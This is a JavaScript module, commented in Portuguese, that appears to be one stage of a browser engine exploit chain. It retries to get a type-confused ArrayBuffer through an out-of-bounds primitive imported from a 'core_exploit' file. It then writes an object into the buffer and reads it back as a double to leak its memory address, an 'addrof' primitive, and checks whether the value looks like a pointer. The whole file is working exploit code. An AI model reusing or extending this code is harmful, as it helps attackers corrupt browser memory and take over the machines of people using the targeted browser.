// js/script3/testArrayBufferVictimCrash.mjs (V3 - Retries for getStableConfusedArrayBuffer)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    getStableConfusedArrayBuffer,
    clearOOBEnvironment,
    // isOOBReady // Pode ser útil, mas getStableConfusedArrayBuffer deve lidar com seu próprio estado OOB
} from '../core_exploit.mjs';

// Nome do módulo atualizado para refletir a nova tentativa com retries
export const FNAME_MODULE_V28 = "Heisenbug_Addrof_V3_Retries";

let object_to_leak_for_addrof_attempt = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Addrof com Retentativas para ArrayBuffer Confuso ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObjectFor_V3_Retries" };

    let errorCapturedMain = null;
    let victim_ab_confused = null;
    const MAX_RETRIES_GET_CONFUSED_AB = 5; // Número de tentativas para obter o buffer confuso
    const RETRY_DELAY_MS = 150;          // Pequeno atraso entre as tentativas

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: `Addrof não tentado ou ArrayBuffer confuso não obtido após ${MAX_RETRIES_GET_CONFUSED_AB} tentativas.`
    };

    try {
        logS3(`PASSO 1: Tentando obter um ArrayBuffer confuso estável (max ${MAX_RETRIES_GET_CONFUSED_AB} tentativas)...`, "info", FNAME_CURRENT_TEST);
        for (let attempt = 1; attempt <= MAX_RETRIES_GET_CONFUSED_AB; attempt++) {
            logS3(`  Tentativa ${attempt}/${MAX_RETRIES_GET_CONFUSED_AB} para getStableConfusedArrayBuffer()...`, "info", FNAME_CURRENT_TEST);

            // getStableConfusedArrayBuffer internamente chama triggerOOB_primitive({ force_reinit: true }),
            // o que deve garantir um ambiente OOB "limpo" para sua própria execução a cada vez.
            victim_ab_confused = await getStableConfusedArrayBuffer();

            if (victim_ab_confused) {
                logS3(`    SUCESSO na tentativa ${attempt}: ArrayBuffer confuso obtido.`, "vuln", FNAME_CURRENT_TEST);
                break; // Sai do loop se obteve sucesso
            } else {
                logS3(`    FALHA na tentativa ${attempt}: getStableConfusedArrayBuffer() retornou null.`, "warn", FNAME_CURRENT_TEST);
                if (attempt < MAX_RETRIES_GET_CONFUSED_AB) {
                    logS3(`    Aguardando ${RETRY_DELAY_MS}ms antes da próxima tentativa...`, "info", FNAME_CURRENT_TEST);
                    // É importante que o ambiente OOB seja limpo ou redefinido se getStableConfusedArrayBuffer falhar,
                    // pois ele pode ter realizado escritas OOB. A flag force_reinit:true em triggerOOB_primitive
                    // dentro de getStableConfusedArrayBuffer deve cuidar disso na próxima chamada.
                    // Uma limpeza explícita aqui pode ser redundante, mas garante.
                    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
                    await PAUSE_S3(RETRY_DELAY_MS);
                }
            }
        }

        if (victim_ab_confused) {
            logS3(`  ArrayBuffer confuso obtido com sucesso. victim_ab_confused: ${victim_ab_confused}`, "vuln", FNAME_CURRENT_TEST);
            logS3(`    Tipo aparente de victim_ab_confused (Object.prototype.toString): ${Object.prototype.toString.call(victim_ab_confused)}`, "info", FNAME_CURRENT_TEST);
            logS3(`    victim_ab_confused instanceof ArrayBuffer: ${victim_ab_confused instanceof ArrayBuffer}`, "info", FNAME_CURRENT_TEST);

            let float64_view_on_victim;
            const fill_pattern = 0.987654321098765; // Padrão para verificar se a escrita ocorre

            try {
                float64_view_on_victim = new Float64Array(victim_ab_confused);
                float64_view_on_victim.fill(fill_pattern);
                logS3(`    Float64Array view criada sobre victim_ab_confused. Padrão preenchido em [0]: ${float64_view_on_victim[0]}`, "info", FNAME_CURRENT_TEST);
            } catch (e_view) {
                logS3(`    ERRO CRÍTICO ao tentar criar Float64Array sobre victim_ab_confused: ${e_view.message}`, "critical", FNAME_CURRENT_TEST);
                addrof_result.message = `Falha ao criar Float64Array no buffer confuso: ${e_view.message}.`;
                document.title = `${FNAME_MODULE_V28}: ViewCreation FAIL`;
                throw e_view;
            }

            logS3(`PASSO 2: Tentando escrever objeto alvo em victim_ab_confused[0] (escrita direta)... (Objeto alvo: ${JSON.stringify(object_to_leak_for_addrof_attempt)})`, "warn", FNAME_CURRENT_TEST);
            victim_ab_confused[0] = object_to_leak_for_addrof_attempt;
            logS3("    Escrita em victim_ab_confused[0] (supostamente) realizada.", "info", FNAME_CURRENT_TEST);

            await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa

            logS3("PASSO 3: Lendo de float64_view_on_victim[0] para verificar o endereço vazado...", "warn", FNAME_CURRENT_TEST);
            const value_read_as_double = float64_view_on_victim[0];
            addrof_result.leaked_address_as_double = value_read_as_double;
            logS3(`    Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

            const double_buffer_for_conversion = new ArrayBuffer(8);
            const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
            const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
            double_view_for_conversion[0] = value_read_as_double;
            addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
            logS3(`    Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

            if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern) > 1e-9 &&
                (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result.success = true;
                addrof_result.message = "ArrayBuffer confuso obtido E leitura de double (diferente do padrão) sugere um ponteiro.";
                document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
            } else {
                let reason = "não parece ponteiro ou buffer não foi alterado do padrão.";
                if (Math.abs(value_read_as_double - fill_pattern) < 1e-9) {
                    reason = "buffer não foi alterado do padrão de preenchimento.";
                } else if (value_read_as_double === 0) {
                    reason = "valor lido foi zero.";
                }
                addrof_result.message = `ArrayBuffer confuso obtido, mas valor lido de float64_view_on_victim[0] ${reason}`;
                logS3(`    INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double}, Padrão: ${fill_pattern})`, "warn", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Confusão OK, Addr Falhou`;
            }

        } else {
            logS3(`  FALHA: Não foi possível obter um ArrayBuffer confuso estável após ${MAX_RETRIES_GET_CONFUSED_AB} tentativas.`, "error", FNAME_CURRENT_TEST);
            // addrof_result.message já foi definido no início para este caso
            document.title = `${FNAME_MODULE_V28}: Obtenção Confusão Falhou`;
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste ${FNAME_CURRENT_TEST}: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n' + e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} CRASHED`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        logS3(`Limpando ambiente OOB após ${FNAME_CURRENT_TEST}...`, "info", FNAME_CURRENT_TEST);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){ // Logar somente se sucesso
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
    }

    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: null,
        toJSON_details: {
            probe_variant: "DirectWrite_After_StableConfusion_V3_Retries",
            this_type_in_toJSON: victim_ab_confused ? Object.prototype.toString.call(victim_ab_confused) : "N/A (buffer não obtido)",
            error_in_toJSON: null,
            probe_called: false
        },
        addrof_attempt_result: addrof_result
    };
}
